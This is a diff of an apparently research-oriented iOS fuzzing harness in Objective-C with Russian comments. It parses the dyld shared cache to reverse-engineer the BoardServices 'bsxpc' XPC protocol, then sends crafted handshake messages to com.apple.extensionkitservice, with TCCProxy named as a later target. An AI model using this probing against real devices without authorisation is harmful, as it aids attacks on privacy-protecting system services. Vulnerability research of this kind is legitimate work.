@@ -35613,6 +35613,10 @@ static void p_bq43(void) {
 static void p_bq44(void) {
     const char *src = "/private/preboot/Cryptexes/OS/System/Library/Caches/com.apple.dyld";
     BOOL cleanup = (getenv("FUZZ_BQ44_CLEAN") != NULL);
+    // v195: FUZZ_BQ44_ONLY=<имя-файла> — копировать только этот сабфайл
+    // (сначала bq45 локализует нужный образ, потом копируем ТОЛЬКО его
+    // сабфайл вместо 7.15 ГБ; strcmp — точное имя, иначе ".01" ловит ".017").
+    const char *only = getenv("FUZZ_BQ44_ONLY");
     if (cleanup) {
         NSString *dpath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
         DIR *dd = opendir(dpath.UTF8String);
@@ -35656,6 +35660,7 @@ static void p_bq44(void) {
     struct dirent *de;
     while ((de = readdir(d))) {
         if (de->d_name[0] == '.') continue;
+        if (only && strcmp(de->d_name, only) != 0) continue;
         char sp[512], dp[640];
         snprintf(sp, sizeof(sp), "%s/%s", src, de->d_name);
         snprintf(dp, sizeof(dp), "%s/%s", dst, de->d_name);
@@ -35759,7 +35764,10 @@ static void p_bq45(void) {
     }
     LOG("[bq45] images table off=0x%x cnt=%u", imgOff, imgCnt);
 
-    const char *want[] = { "libIOKit", "IOKit.framework", "libdispatch.dylib", NULL };
+    // v195: локация клиентских фреймворков BS-домена (wire-формат
+    // extensionkitservice, §202); прежняя цель — libIOKit для VM-гостя.
+    const char *want[] = { "BootstrapServices", "ExtensionFoundation",
+                           "ExtensionKit.framework", NULL };
     for (int w = 0; want[w]; w++) {
         uint64_t addr = 0;
         char fpath[512] = {0};
@@ -35810,6 +35818,1334 @@ static void p_bq45(void) {
     close(fd);
     LOG("[bq45] done");
 }
+
+// bq46: v196 — охота за wire-протоколом BS-домена. Сервис
+// extensionkitservice отвечает на любое сообщение {"bsxpc":"invalidate"};
+// строка "bsxpc" НЕ найдена в сабфайлах .01/.30 (ExtensionFoundation/
+// ExtensionKit) → протокол живёт в другом образе (кандидат —
+// SpringBoardServices @0x19a966000, домашний фреймворк BS-классов). Также:
+// селектор клиента лежит в пуле @0x1f56ce531 (адрес из тромблона
+// libobjcMsgSend, adrp+add) — пул в непотянутом сабфайле.
+// Фаза READ-ONLY: (1) по таблице маппингов каждого сабфайла найти
+// владельцев целевых vm; (2) memmem "bsxpc" по всем сабфайлам + контекст
+// строк ±0x400; (3) вычитать селектор по vm.
+static void p_bq46(void) {
+    const char *cdir = "/private/preboot/Cryptexes/OS/System/Library/Caches/com.apple.dyld";
+    DIR *cd = opendir(cdir);
+    if (!cd) { LOG("[bq46] CONTROL FAILED: opendir errno %d", errno); return; }
+    NSString *headFile = nil;
+    NSMutableArray<NSString *> *subs = [NSMutableArray array];
+    struct dirent *ce;
+    while ((ce = readdir(cd))) {
+        if (ce->d_name[0] == '.') continue;
+        if (strstr(ce->d_name, ".symbols")) continue;
+        if (!strstr(ce->d_name, "dyld_shared_cache")) continue;
+        char p[1400];
+        snprintf(p, sizeof(p), "%s/%s", cdir, ce->d_name);
+        [subs addObject:[NSString stringWithUTF8String:p]];
+        if (!strchr(ce->d_name, '.'))
+            headFile = [NSString stringWithUTF8String:p];
+    }
+    closedir(cd);
+    if (!headFile || subs.count < 3) {
+        LOG("[bq46] CONTROL FAILED: head=%d subs=%d", headFile != nil, (int)subs.count);
+        return;
+    }
+    // таблица образов (bq45: 4690 @0x2a8)
+    int hfd = open(headFile.fileSystemRepresentation, O_RDONLY);
+    struct stat hst; fstat(hfd, &hst);
+    void *hmap = mmap(NULL, (size_t)hst.st_size, PROT_READ, MAP_FILE | MAP_PRIVATE, hfd, 0);
+    close(hfd);
+    if (hmap == MAP_FAILED) { LOG("[bq46] CONTROL FAILED: head mmap"); return; }
+    const char *hb = (const char *)hmap;
+    enum { NIMG = 4690 };
+    uint64_t imgaddr[NIMG];
+    const char *imgpath[NIMG];
+    for (int i = 0; i < NIMG; i++) {
+        memcpy(&imgaddr[i], hb + 0x2a8 + i*32, 8);
+        uint32_t poff; memcpy(&poff, hb + 0x2a8 + i*32 + 24, 4);
+        imgpath[i] = hb + poff;
+    }
+    LOG("[bq46] images=%d, subfiles=%d", NIMG, (int)subs.count);
+    // целевые vm: пул селекторов (тромблон 0x1880975f0 → 0x1f56ce531)
+    // и SpringBoardServices (кандидат хозяина bsxpc)
+    const uint64_t wantVMs[] = { 0x1F56CE531ULL, 0x19A966000ULL };
+    const char *wantName[] = { "selector-pool(+0x531)", "SpringBoardServices" };
+    int nbsx = 0;
+    for (NSString *sp in subs) {
+        int fd = open(sp.fileSystemRepresentation, O_RDONLY);
+        if (fd < 0) continue;
+        struct stat st; fstat(fd, &st);
+        unsigned char hdr[64];
+        if (pread(fd, hdr, 64, 0) != 64) { close(fd); continue; }
+        uint32_t mo, mc; memcpy(&mo, hdr+0x10, 4); memcpy(&mc, hdr+0x14, 4);
+        if (mc == 0 || mc > 64 || (uint64_t)mo + (uint64_t)mc*32 > (uint64_t)st.st_size) {
+            LOG("[bq46] skip %s: bad hdr mo=%u mc=%u", sp.lastPathComponent.UTF8String, mo, mc);
+            close(fd); continue;
+        }
+        struct { uint64_t addr, size, foff; } mp[64];
+        if (pread(fd, mp, mc*32, mo) != (ssize_t)(mc*32)) { close(fd); continue; }
+        BOOL covers[2] = { NO, NO };
+        uint64_t selOff = 0;
+        for (uint32_t k = 0; k < mc; k++) {
+            for (int w = 0; w < 2; w++) {
+                if (wantVMs[w] >= mp[k].addr && wantVMs[w] < mp[k].addr + mp[k].size) {
+                    covers[w] = YES;
+                    if (w == 0) selOff = mp[k].foff + (wantVMs[w] - mp[k].addr);
+                }
+            }
+        }
+        void *map = mmap(NULL, (size_t)st.st_size, PROT_READ, MAP_FILE | MAP_PRIVATE, fd, 0);
+        close(fd);
+        if (map == MAP_FAILED) continue;
+        const char *mb = (const char *)map;
+        // (3) селектор из пула
+        if (covers[0]) {
+            char sel[96] = {0};
+            if (selOff + 96 < (uint64_t)st.st_size) {
+                memcpy(sel, mb + selOff, 95);
+                sel[strcspn(sel, "\n")] = 0;
+            }
+            LOG("[bq46] %s: SEL-POOL %s @0x%llx -> \"%s\"",
+                sp.lastPathComponent.UTF8String, wantName[0],
+                (unsigned long long)wantVMs[0], sel);
+        }
+        if (covers[1]) {
+            LOG("[bq46] %s: covers %s @0x%llx",
+                sp.lastPathComponent.UTF8String, wantName[1],
+                (unsigned long long)wantVMs[1]);
+        }
+        // (2) поиск "bsxpc"
+        const char *p = mb, *end = mb + st.st_size - 6;
+        int local = 0;
+        while (p < end && local < 6) {
+            const char *h = memmem(p, end - p, "bsxpc", 5);
+            if (!h) break;
+            long off = (long)(h - mb);
+            // vm через маппинги
+            uint64_t vm = 0; BOOL vmOK = NO;
+            for (uint32_t k = 0; k < mc; k++) {
+                if ((uint64_t)off >= mp[k].foff && (uint64_t)off < mp[k].foff + mp[k].size) {
+                    vm = mp[k].addr + ((uint64_t)off - mp[k].foff); vmOK = YES; break;
+                }
+            }
+            // образ
+            const char *img = "?";
+            if (vmOK) {
+                int lo = 0, hi = NIMG - 1, best = -1;
+                while (lo <= hi) {
+                    int mid = (lo + hi) / 2;
+                    if (imgaddr[mid] <= vm) { best = mid; lo = mid + 1; }
+                    else hi = mid - 1;
+                }
+                if (best >= 0) img = imgpath[best];
+            }
+            LOG("[bq46] %s: bsxpc @fileoff 0x%lx vm=0x%llx img=%s",
+                sp.lastPathComponent.UTF8String, off,
+                vmOK ? (unsigned long long)vm : 0ULL, img);
+            // контекст: печатные прогоны ±0x400
+            long lo0 = off > 0x400 ? off - 0x400 : 0;
+            long hi0 = off + 0x400; if (hi0 > st.st_size) hi0 = st.st_size;
+            long i = lo0; int shown = 0;
+            while (i < hi0 && shown < 40) {
+                while (i < hi0 && (mb[i] < 0x20 || mb[i] > 0x7e)) i++;
+                long s0 = i;
+                while (i < hi0 && mb[i] >= 0x20 && mb[i] <= 0x7e) i++;
+                if (i - s0 >= 4) {
+                    char t[110]; int tl = (int)(i - s0); if (tl > 100) tl = 100;
+                    memcpy(t, mb + s0, tl); t[tl] = 0;
+                    LOG("[bq46]   ctx 0x%lx: %s", s0, t);
+                    shown++;
+                }
+            }
+            nbsx++;
+            local++;
+            p = h + 5;
+        }
+        munmap(map, (size_t)st.st_size);
+    }
+    LOG("[bq46] bsxpc total hits=%d", nbsx);
+    munmap(hmap, (size_t)hst.st_size);
+    LOG("[bq46] done");
+}
+
+// bq47: v197 — продолжение RE протокола BSXPC (v196): ключи протокола
+// найдены (bsxpc/bsxpc_SEL/BATCH/CID/CIDr/context в BoardServices), но
+// (1) селектор клиента ExtensionFoundation запечён в тромблоне
+// libobjcMsgSend (0x1880975f0 → adrp+add → пул селекторов в dylddata-
+// сабфайле), (2) сами ключи — CFString-объекты в __AUTH_CONST (тоже
+// dylddata), без которых не найти код, ссылающийся на них (xref).
+// Фаза строит глобальный индекс vm→сабфайл (все 79 сабфайлов) и
+// вычитывает с ПЕРЕБОРОМ кандидатов (у dylddata маппинги последнего
+// блока выходят за filesize — валидация только на уровне чтения):
+//   (a) селектор из тромблона 0x1880975f0 (паттерн adrp+add валидирует);
+//   (b) cfstring-объекты BoardServices (__cfstring vm=0x1e9e23258,
+//       size=0x5ba0) → ключи протокола + их cfstring-вм для xref;
+//   (c) selrefs ExtensionFoundation (__objc_selrefs vm=0x1e07472d0,
+//       size=0x2888) → клиентские селекторы (фильтр по ключевым словам).
+// READ-ONLY.
+enum { BQ47_MAXM = 512 };
+static struct { uint64_t addr, size, foff, fsz; int fd; } bq47m[BQ47_MAXM];
+static NSString *bq47f[BQ47_MAXM];
+static int bq47nm = 0;
+
+// индексировать все сабфайлы (вызывается один раз)
+static void bq47_index(void) {
+    const char *cdir = "/private/preboot/Cryptexes/OS/System/Library/Caches/com.apple.dyld";
+    DIR *cd = opendir(cdir);
+    if (!cd) { LOG("[bq47] CONTROL FAILED: opendir errno %d", errno); return; }
+    struct dirent *ce;
+    while ((ce = readdir(cd))) {
+        if (ce->d_name[0] == '.') continue;
+        if (strstr(ce->d_name, "dyld_shared_cache") == NULL) continue;
+        char p[1400];
+        snprintf(p, sizeof(p), "%s/%s", cdir, ce->d_name);
+        int fd = open(p, O_RDONLY);
+        if (fd < 0) continue;
+        unsigned char hdr[64];
+        if (pread(fd, hdr, 64, 0) != 64) { close(fd); continue; }
+        uint32_t mo, mc; memcpy(&mo, hdr+0x10, 4); memcpy(&mc, hdr+0x14, 4);
+        if (mc == 0 || mc > 32 || (uint64_t)mo + (uint64_t)mc*32 > 0x100000ULL) {
+            close(fd); continue;   // .symbols / .atlas — пропустить
+        }
+        struct { uint64_t addr, size, foff; uint32_t maxprot, initprot; } mp[32];
+        if (pread(fd, mp, mc*32, mo) != (ssize_t)(mc*32)) { close(fd); continue; }
+        struct stat st; fstat(fd, &st);
+        NSString *fp = [NSString stringWithUTF8String:p];
+        BOOL any = NO;
+        for (uint32_t k = 0; k < mc && bq47nm < BQ47_MAXM; k++) {
+            if (mp[k].size == 0 || mp[k].size > 0x40000000ULL) continue;
+            if (mp[k].foff >= (uint64_t)st.st_size) continue;
+            bq47m[bq47nm].addr = mp[k].addr; bq47m[bq47nm].size = mp[k].size;
+            bq47m[bq47nm].foff = mp[k].foff; bq47m[bq47nm].fsz = (uint64_t)st.st_size;
+            bq47m[bq47nm].fd = fd;
+            bq47f[bq47nm] = fp; bq47nm++; any = YES;
+        }
+        if (!any) close(fd);
+    }
+    closedir(cd);
+}
+
+// следующий кандидат-маппинг, покрывающий vm; *offp — fileoff для чтения
+// len байт; возвращает индекс или -1 (перебор с startIdx)
+static int bq47_next(uint64_t vm, int len, int startIdx, uint64_t *offp) {
+    for (int i = startIdx; i < bq47nm; i++) {
+        if (vm < bq47m[i].addr || vm >= bq47m[i].addr + bq47m[i].size) continue;
+        uint64_t off = bq47m[i].foff + (vm - bq47m[i].addr);
+        if (off + (uint64_t)len > bq47m[i].fsz) continue;   // чтение целиком в файле
+        *offp = off;
+        return i;
+    }
+    return -1;
+}
+
+static void p_bq47(void) {
+    bq47_index();
+    if (bq47nm < 5) { LOG("[bq47] CONTROL FAILED: nm=%d", bq47nm); return; }
+    LOG("[bq47] mappings=%d", bq47nm);
+    // --- (a) тромблон 0x1880975f0: adrp x1, P; add x1,x1,#imm → селектор
+    {
+        uint64_t off; int i = -1, tr = 0;
+        while ((i = bq47_next(0x1880975F0ULL, 16, i + 1, &off)) >= 0) {
+            uint32_t w[4];
+            if (pread(bq47m[i].fd, w, 16, off) != 16) continue;
+            tr++;
+            uint32_t w0 = w[0], w1 = w[1];
+            if ((w0 & 0x9f00001f) != 0x90000001) continue;   // adrp x1
+            if ((w1 & 0xffc003ff) != 0x91000021) continue;   // add x1,x1,#imm12
+            int64_t imm = ((int64_t)((w0 >> 5) & 0x7ffff) << 2) | ((w0 >> 29) & 3);
+            if (imm & (1LL << 20)) imm -= (1LL << 21);
+            uint64_t page = (0x1880975F0ULL & ~0xfffULL) + (imm << 12);
+            uint64_t selvm = page + ((w1 >> 10) & 0xfff);
+            // читать селектор (перебор кандидатов, валидация — печатные символы)
+            int j = -1; uint64_t soff;
+            while ((j = bq47_next(selvm, 96, j + 1, &soff)) >= 0) {
+                char s[100] = {0};
+                if (pread(bq47m[j].fd, s, 96, soff) != 96) continue;
+                int ok = s[0] >= 'A' && s[0] <= 'z';
+                for (int c = 0; ok && c < 95 && s[c]; c++)
+                    if (s[c] < 0x20 || s[c] > 0x7e) ok = 0;
+                s[95] = 0;
+                if (!ok) continue;
+                LOG("[bq47] TRAMP-SEL vm=0x%llx owner=%s -> \"%s\"", selvm,
+                    bq47f[j].lastPathComponent.UTF8String, s);
+                break;
+            }
+            if (j < 0) LOG("[bq47] TRAMP-SEL vm=0x%llx read-fail", selvm);
+        }
+        LOG("[bq47] trampoline candidates=%d", tr);
+    }
+    // --- (b) cfstring BoardServices: объекты → ключи протокола
+    {
+        const uint64_t CFS = 0x1E9E23258ULL; const int CFSZ = 0x5BA0;
+        const char *want[] = { "bsxpc", "bsxpc_SEL", "bsxpc_BATCH", "bsxpc_CID",
+                               "bsxpc_CIDr", "bsxpc_context", "connect", "activate",
+                               "invalidate", NULL };
+        static char cf[0x5BA0];
+        int i = -1; uint64_t off;
+        while ((i = bq47_next(CFS, CFSZ, i + 1, &off)) >= 0) {
+            if (pread(bq47m[i].fd, cf, CFSZ, off) != CFSZ) continue;
+            int nobj = 0;
+            for (int o = 0; o + 32 <= CFSZ; o += 32) {
+                uint64_t isa, flags, ptr, len;
+                memcpy(&isa, cf+o, 8); memcpy(&flags, cf+o+8, 8);
+                memcpy(&ptr, cf+o+16, 8); memcpy(&len, cf+o+24, 8);
+                if (len == 0 || len > 64) continue;
+                if (ptr < 0x180400000ULL || ptr > 0x230000000ULL) continue;
+                if (isa < 0x180400000ULL || isa > 0x230000000ULL) continue;
+                // прочитать строку по ptr (перебор кандидатов)
+                int j = -1; uint64_t soff;
+                while ((j = bq47_next(ptr, 80, j + 1, &soff)) >= 0) {
+                    char s[80] = {0};
+                    if (pread(bq47m[j].fd, s, 79, soff) <= 0) continue;
+                    s[len < 79 ? (int)len : 79] = 0;
+                    for (int c = 0; c < 79 && s[c]; c++)
+                        if (s[c] < 0x20 || s[c] > 0x7e) { s[0] = 1; break; }
+                    if (s[0] == 1) continue;
+                    for (int w = 0; want[w]; w++) {
+                        if (strcmp(s, want[w]) == 0) {
+                            LOG("[bq47] CFSTR key=\"%s\" cfstring_vm=0x%llx owner=%s",
+                                s, CFS + o, bq47f[i].lastPathComponent.UTF8String);
+                            nobj++;
+                            break;
+                        }
+                    }
+                    break;   // строка прочитана — дальше по объектам
+                }
+            }
+            LOG("[bq47] cfstring section owner=%s matched=%d",
+                bq47f[i].lastPathComponent.UTF8String, nobj);
+            break;   // секция прочитана целиком — достаточно
+        }
+    }
+    // --- (c) selrefs ExtensionFoundation: клиентские селекторы
+    {
+        const uint64_t SR = 0x1E07472D0ULL; const int SRSZ = 0x2888;
+        static uint64_t sel[0x2888 / 8];
+        int i = -1; uint64_t off;
+        while ((i = bq47_next(SR, SRSZ, i + 1, &off)) >= 0) {
+            if (pread(bq47m[i].fd, sel, SRSZ, off) != SRSZ) continue;
+            int shown = 0;
+            for (int k = 0; k < SRSZ/8 && shown < 150; k++) {
+                uint64_t p = sel[k];
+                if (p < 0x180400000ULL || p > 0x230000000ULL) continue;
+                int j = -1; uint64_t soff;
+                while ((j = bq47_next(p, 96, j + 1, &soff)) >= 0) {
+                    char s[96] = {0};
+                    if (pread(bq47m[j].fd, s, 95, soff) <= 0) continue;
+                    for (int c = 0; c < 95 && s[c]; c++)
+                        if (s[c] < 0x20 || s[c] > 0x7e) { s[c] = 0; break; }
+                    if (!strcasestr(s, "service") && !strcasestr(s, "domain") &&
+                        !strcasestr(s, "connect") && !strcasestr(s, "endpoint") &&
+                        !strcasestr(s, "discov") && !strcasestr(s, "launch") &&
+                        !strcasestr(s, "observ") && !strcasestr(s, "tcc") &&
+                        !strcasestr(s, "activ") && !strcasestr(s, "invalid") &&
+                        !strcasestr(s, "message") && !strcasestr(s, "session") &&
+                        !strcasestr(s, "capab") && !strcasestr(s, "bootstrap")) continue;
+                    LOG("[bq47] EF-SEL[0x%x] vm=0x%llx \"%s\"", k * 8, p, s);
+                    shown++;
+                    break;
+                }
+            }
+            LOG("[bq47] EF-SEL owner=%s shown=%d",
+                bq47f[i].lastPathComponent.UTF8String, shown);
+            break;
+        }
+    }
+    LOG("[bq47] done");
+}
+
+// bq48: v197 — диагностика карты маппингов (после bq47: vm пула селекторов
+// 0x1f56ce531 и __AUTH_CONST 0x1e9e2xxxx не имеют валидного читаемого
+// владельца, хотя таблицы маппингов заявляют покрытие). Фаза логирует:
+// (1) все маппинги каждого сабфайла (addr/size/foff + filesize);
+// (2) декод 8 тромблонов 0x1880975e0..+0x60 (adrp+add → vm селектора)
+//     с hex-дампом того, что читается по результату;
+// (3) hex-дамп ±0x40 вокруг 0x1f56ce531 из всех претендентов.
+// READ-ONLY.
+static void p_bq48(void) {
+    bq47_index();
+    if (bq47nm < 5) { LOG("[bq48] CONTROL FAILED: nm=%d", bq47nm); return; }
+    LOG("[bq48] mappings=%d", bq47nm);
+    // (1) карта маппингов
+    NSString *last = nil; int cnt = 0;
+    for (int i = 0; i < bq47nm; i++) {
+        NSString *nm2 = bq47f[i].lastPathComponent;
+        if (![nm2 isEqualToString:last]) {
+            LOG("[bq48] %s fsz=0x%llx", nm2.UTF8String, (unsigned long long)bq47m[i].fsz);
+            last = nm2; cnt = 0;
+        }
+        if (cnt++ < 8)
+            LOG("[bq48]   vm 0x%llx +0x%llx foff 0x%llx",
+                (unsigned long long)bq47m[i].addr, (unsigned long long)bq47m[i].size,
+                (unsigned long long)bq47m[i].foff);
+    }
+    // (2) тромблоны
+    for (uint64_t tv = 0x1880975E0ULL; tv <= 0x188097650ULL; tv += 0x10) {
+        uint64_t off; int i = bq47_next(tv, 16, 0, &off);
+        if (i < 0) { LOG("[bq48] tramp 0x%llx: no owner", tv); continue; }
+        uint32_t w[4];
+        if (pread(bq47m[i].fd, w, 16, off) != 16) continue;
+        if ((w[0] & 0x9f00001f) != 0x90000001 || (w[1] & 0xffc003ff) != 0x91000021) {
+            LOG("[bq48] tramp 0x%llx: pattern no (%08x %08x)", tv, w[0], w[1]);
+            continue;
+        }
+        int64_t imm = ((int64_t)((w[0] >> 5) & 0x7ffff) << 2) | ((w[0] >> 29) & 3);
+        if (imm & (1LL << 20)) imm -= (1LL << 21);
+        uint64_t page = (tv & ~0xfffULL) + (imm << 12);
+        uint64_t selvm = page + ((w[1] >> 10) & 0xfff);
+        // попытка чтения + hex того что есть
+        int j = -1; uint64_t soff; char s[48];
+        j = bq47_next(selvm, 48, 0, &soff);
+        BOOL rd = (j >= 0 && pread(bq47m[j].fd, s, 48, soff) == 48);
+        char hex[100] = {0}; char txt[49] = {0};
+        for (int c = 0; c < 48; c++) {
+            if (rd) sprintf(hex + c*2, "%02x", (unsigned char)s[c]);
+            txt[c] = (rd && s[c] >= 0x20 && s[c] <= 0x7e) ? s[c] : '.';
+        }
+        LOG("[bq48] tramp 0x%llx -> selvm=0x%llx owner=%s hex=%s txt=%s", tv, selvm,
+            j >= 0 ? bq47f[j].lastPathComponent.UTF8String : "NONE", hex, txt);
+    }
+    // (3) hex ±0x40 вокруг 0x1f56ce531 из всех претендентов
+    for (int i = 0; i < bq47nm; i++) {
+        uint64_t vm = 0x1F56CE531ULL;
+        if (vm < bq47m[i].addr || vm >= bq47m[i].addr + bq47m[i].size) continue;
+        uint64_t base = (vm & ~0x3fULL) - 0x20;
+        uint64_t off = bq47m[i].foff + (base - bq47m[i].addr);
+        if (off + 0x60 > bq47m[i].fsz) {
+            LOG("[bq48] pool claimant %s: off 0x%llx beyond fsz 0x%llx",
+                bq47f[i].lastPathComponent.UTF8String, (unsigned long long)off,
+                (unsigned long long)bq47m[i].fsz);
+            continue;
+        }
+        char s[0x60];
+        if (pread(bq47m[i].fd, s, 0x60, off) != 0x60) continue;
+        char hex[200] = {0};
+        for (int c = 0; c < 0x60; c++) sprintf(hex + c*2, "%02x", (unsigned char)s[c]);
+        LOG("[bq48] pool claimant %s foff=0x%llx hex=%s",
+            bq47f[i].lastPathComponent.UTF8String, (unsigned long long)off, hex);
+    }
+    LOG("[bq48] done");
+}
+
+// bq49: v197 — сырой разбор заголовка dylddata-сабфайла (.25): таблица
+// маппингов из поля 0x10/0x14 даёт только 2 крошечных записи (0x4000)
+// при filesize 228 МБ — реальная таблица либо в другом поле, либо имеет
+// другую разрядку. Фаза: (1) hex-дамп заголовка 0x00..0x280; (2) брутфорс
+// поиска правдоподобных mapping-записей (u64 addr в диапазоне кэша,
+// u64 size < 0x10000000, u64 foff < filesize, stride 32..64) в первых
+// 0x1000 байтах. READ-ONLY.
+static void p_bq49(void) {
+    const char *cdir = "/private/preboot/Cryptexes/OS/System/Library/Caches/com.apple.dyld";
+    DIR *cd = opendir(cdir);
+    if (!cd) { LOG("[bq49] CONTROL FAILED: opendir errno %d", errno); return; }
+    char path[1400] = {0};
+    struct dirent *ce;
+    while ((ce = readdir(cd))) {
+        if (strstr(ce->d_name, ".25.dylddata")) {
+            snprintf(path, sizeof(path), "%s/%s", cdir, ce->d_name);
+            break;
+        }
+    }
+    closedir(cd);
+    if (!path[0]) { LOG("[bq49] CONTROL FAILED: .25.dylddata not found"); return; }
+    int fd = open(path, O_RDONLY);
+    if (fd < 0) { LOG("[bq49] CONTROL FAILED: open errno %d", errno); return; }
+    struct stat st; fstat(fd, &st);
+    LOG("[bq49] file=%s fsz=0x%llx", strrchr(path, '/') + 1, (unsigned long long)st.st_size);
+    // (1) заголовок
+    static unsigned char hdr[0x280];
+    if (pread(fd, hdr, 0x280, 0) != 0x280) { LOG("[bq49] hdr read fail"); close(fd); return; }
+    for (int i = 0; i < 0x280; i += 32) {
+        char line[80] = {0};
+        for (int j = 0; j < 32; j++) sprintf(line + j*2, "%02x", hdr[i+j]);
+        LOG("[bq49] %03x: %s", i, line);
+    }
+    uint32_t mo, mc; memcpy(&mo, hdr+0x10, 4); memcpy(&mc, hdr+0x14, 4);
+    LOG("[bq49] field@0x10(mo)=0x%x field@0x14(mc)=%u", mo, mc);
+    // (2) брутфорс правдоподобных записей в первых 0x1000 байтах
+    static unsigned char buf[0x1000];
+    if (pread(fd, buf, 0x1000, 0) != 0x1000) { close(fd); return; }
+    for (int stride = 32; stride <= 64; stride += 8) {
+        int found = 0;
+        for (int off = 0; off + 3*8 <= 0x1000 - 256; off += 8) {
+            uint64_t addr, size, foff;
+            memcpy(&addr, buf+off, 8); memcpy(&size, buf+off+8, 8); memcpy(&foff, buf+off+16, 8);
+            if (addr < 0x180000000ULL || addr > 0x300000000ULL) continue;
+            if (size == 0 || size > 0x10000000ULL) continue;
+            if (foff > (uint64_t)st.st_size) continue;
+            if (addr & 0xfff) continue;
+            // проверить что следующая запись через stride тоже правдоподобна
+            if (off + stride + 24 <= 0x1000) {
+                uint64_t a2, s2, f2;
+                memcpy(&a2, buf+off+stride, 8); memcpy(&s2, buf+off+stride+8, 8);
+                memcpy(&f2, buf+off+stride+16, 8);
+                if (a2 < 0x180000000ULL || a2 > 0x300000000ULL || (a2 & 0xfff)) continue;
+                if (s2 == 0 || s2 > 0x10000000ULL) continue;
+                if (f2 > (uint64_t)st.st_size) continue;
+            }
+            LOG("[bq49] stride=%d off=0x%x: addr=0x%llx size=0x%llx foff=0x%llx",
+                stride, off, (unsigned long long)addr, (unsigned long long)size,
+                (unsigned long long)foff);
+            if (++found >= 6) break;
+        }
+        if (found) LOG("[bq49] stride=%d: %d candidates", stride, found);
+    }
+    close(fd);
+    LOG("[bq49] done");
+}
+
+// p_bq50 — v198: ПРОБНЫЙ BSXPC-ДИАЛОГ с com.apple.extensionkitservice.
+// Карта wire-протокола BoardServices (RE, §203):
+//   * тег "bsxpc": "activate" | "connect" | "invalidate" | "interrupt";
+//   * activate-обработчик (0x18fb0297c) логирует "Activation message
+//     received." и читает bsxpc_CID (str) / bsxpc_CIDr (bool);
+//   * connect читает bsxpc_context (obj) и "lp" (str) — child-соединение;
+//   * БЕЗ тега — обычный вызов, диспетчер читает "bsxpc_SEL" (0x18fae69a0);
+//   * endpoint-подсловарь: e/o/nl/p/t/s/i (encA 0x18fb08644, encB 0x18fb1e834).
+// КОНТРОЛЬ (§144): голое {} ЛЮБОЕ сообщение даёт {"bsxpc":"invalidate"}
+// (наблюдено v194) — если control-empty НЕ даст invalidate, детектор сломан,
+// вердикты не выносить. Позитив = ответ с тегом != invalidate, либо
+// отсутствие ответа на activate (accept молча) при живом контроле.
+// Диалог с самим TCCProxy (методы подсервиса) — отдельный шаг после
+// согласования с оператором; здесь только handshake-слой base-соединения.
+static void bq50_run(dispatch_queue_t q, const char *label,
+                     xpc_object_t pre, xpc_object_t m,
+                     int want, int *nev_out, char *tag_out, size_t tag_sz) {
+    __block int nev = 0;
+    __block BOOL done = NO;
+    if (tag_out && tag_sz) tag_out[0] = 0;
+    NSString *ls = @(label);
+    LOG("[bq50] run ENTER %s", label);
+    xpc_connection_t c = xpc_connection_create(
+        "com.apple.extensionkitservice", q);
+    if (!c) {
+        LOG("[bq50] %s: create NULL", label);
+        if (nev_out) *nev_out = -1;
+        return;
+    }   // xpc_object_t — ARC-объект, ручные xpc_release дают over-release
+    xpc_connection_set_event_handler(c, ^(xpc_object_t ev) {
+        if (done || nev >= 4) return;
+        BOOL isErr = xpc_get_type(ev) == XPC_TYPE_ERROR;
+        const char *tag = NULL;
+        if (!isErr && xpc_get_type(ev) == XPC_TYPE_DICTIONARY)
+            tag = xpc_dictionary_get_string(ev, "bsxpc");
+        char *d = xpc_copy_description(ev);
+        LOG("[bq50] %s ev#%d %s bsxpc=%s: %.500s", ls.UTF8String, nev + 1,
+            isErr ? "[ERR]" : "[MSG]", tag ?: "-", d ?: "?");
+        free(d);
+        if (tag_out && tag_sz && !tag_out[0]) {
+            // ошибка XPC (connection invalid/interrupted) — это РЕДЖЕКТ,
+            // не позитив: помечаем явно, чтобы классификация не путала
+            snprintf(tag_out, tag_sz, "%s", isErr ? "ERR" : (tag ?: "NOTAG"));
+        }
+        nev++;
+    });
+    xpc_connection_resume(c);
+    if (pre) {
+        xpc_connection_send_message(c, pre);
+        usleep(400000);   // дать activate устаканиться до основного сообщения
+    }
+    xpc_connection_send_message(c, m);
+    for (int t = 0; t < 20 && nev < want; t++) usleep(100000);
+    if (nev == 0) LOG("[bq50] %s: NO EVENT in 2s", label);
+    done = YES;
+    xpc_connection_cancel(c);
+    LOG("[bq50] run EXIT %s nev=%d", label, nev);
+    if (nev_out) *nev_out = nev;
+}
+
+static void p_bq50(void) {
+    LOG("[bq50] v198 BSXPC trial dialog: com.apple.extensionkitservice");
+    dispatch_queue_t q = dispatch_queue_create("bq50.q", DISPATCH_QUEUE_SERIAL);
+    int ctl = 0, pos = 0, nctl = 0, nnoreply = 0;
+    char tag[64];
+
+    // 1) КОНТРОЛЬ: голое сообщение -> заведомо {"bsxpc":"invalidate"}
+    {
+        int n = 0;
+        xpc_object_t m = xpc_dictionary_create(NULL, NULL, 0);
+        bq50_run(q, "ctl-empty", NULL, m, 1, &n, tag, sizeof(tag));
+        if (!strcmp(tag, "invalidate")) { ctl = 1; nctl = 1; }
+        LOG("[bq50] ctl-empty: nev=%d tag=%s -> control %s",
+            n, tag[0] ? tag : "-", ctl ? "OK" : "FAILED");
+    }
+    if (!ctl) {
+        LOG("[bq50] CONTROL FAILED (нет invalidate на голом сообщении) — "
+            "детектор сломан, вердикты не выносятся (§144)");
+        return;
+    }
+
+    // 2) activate — первый handshake-вариант
+    {
+        LOG("[bq50] step2 activate begin");
+        int n = 0;
+        xpc_object_t m = xpc_dictionary_create(NULL, NULL, 0);
+        LOG("[bq50] step2 dict created");
+        xpc_dictionary_set_string(m, "bsxpc", "activate");
+        LOG("[bq50] step2 key set");
+        bq50_run(q, "activate", NULL, m, 1, &n, tag, sizeof(tag));
+        if (n == 0) { nnoreply++; LOG("[bq50] activate: MOLCH (нет ответа)"); }
+        else if (strcmp(tag, "invalidate") && strcmp(tag, "ERR")) { pos++; LOG("[bq50] activate: POSITIVE tag=%s", tag); }
+        else LOG("[bq50] activate: rejected (invalidate)");
+    }
+
+    // 3) activate + bsxpc_CID/CIDr (как пишет setChildIdentifier)
+    {
+        int n = 0;
+        xpc_object_t m = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_dictionary_set_string(m, "bsxpc", "activate");
+        xpc_dictionary_set_string(m, "bsxpc_CID", "1");
+        xpc_dictionary_set_bool(m, "bsxpc_CIDr", false);
